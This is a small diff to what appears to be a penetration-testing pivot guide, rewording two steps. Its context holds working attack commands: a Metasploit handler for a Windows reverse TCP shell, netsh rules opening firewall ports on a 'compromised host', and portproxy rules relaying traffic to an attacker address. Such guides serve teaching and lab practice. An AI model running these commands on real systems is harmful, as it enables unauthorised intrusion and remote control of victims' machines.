@@ -48,7 +48,7 @@ msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; 
 ```powershell
 netsh advfirewall firewall add rule name="TCP Port 4422 Allow In" dir=in action=allow protocol=TCP localport=4422;
 ```
-5. (Compromised Host) Redirect TCP traffic received on 4422 (listening on internal 10.10.1.200) and redirect it to attacker at 192.168.75.85 port 80
+5. (Compromised Host) Redirect TCP traffic received on 4422 (listening on internal 10.10.1.200) to attacker at 192.168.75.85 port 80
 ```powershell
 netsh interface portproxy add v4tov4 listenport=4422 listenaddress=10.10.1.200 connectport=80 connectaddress=192.168.75.85;
 ```
@@ -56,7 +56,7 @@ netsh interface portproxy add v4tov4 listenport=4422 listenaddress=10.10.1.200 c
 ```powershell
 netsh advfirewall firewall add rule name="TCP Port 8669 Allow In" dir=in action=allow protocol=TCP localport=8669;
 ```
-7. (Compromised Host) Redirect TCP traffic received on 8669 (listening on internal 10.10.1.200) and redirect it to attacker at 192.168.75.85 port 8669
+7. (Compromised Host) Redirect TCP traffic received on 8669 (listening on internal 10.10.1.200) to attacker at 192.168.75.85 port 8669
 ```powershell
 netsh interface portproxy add v4tov4 listenport=8669 listenaddress=10.10.1.200 connectport=8669 connectaddress=192.168.75.85;
 ```
